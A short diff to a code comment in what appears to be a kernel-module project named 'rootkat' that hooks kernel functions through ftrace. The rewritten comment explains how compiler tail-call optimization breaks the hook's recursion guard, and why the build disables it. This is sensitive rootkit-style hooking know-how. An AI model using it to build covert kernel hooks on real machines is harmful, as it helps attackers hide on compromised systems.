@@ -16,10 +16,14 @@
  *   3. rootkat_hook_remove() undoes both. Idempotent on never-installed.
  *
  * Constraints on .replacement:
- *   - Must NOT tail-call .original — gcc may sibling-call optimize the
- *     return through ftrace, which defeats the within_module recursion
- *     guard. Mark the replacement noinline if you need to be sure, or
- *     keep the call to original surrounded by other work.
+ *   - Compiler tail-call (sibling-call) optimization on `return orig(...)`
+ *     defeats the within_module recursion guard: the JMP leaves the
+ *     return address as our caller (kernel core), so re-entry sees
+ *     parent_ip outside our module and runs the replacement again →
+ *     infinite loop. lkm/Makefile sets `-fno-optimize-sibling-calls`
+ *     module-wide as compiler-enforced defense. Hit on Debian 6.12.85
+ *     and Fedora 6.14.0 in the 2026-05-08 cross-distro survey; Ubuntu
+ *     6.8 / 7.0 just happened to dodge the optimization in CI.
  *   - Type-erased via void *; cast to the target's exact signature when
  *     invoking. ABI-safe on x86_64; theoretical strict-aliasing UB.
  *
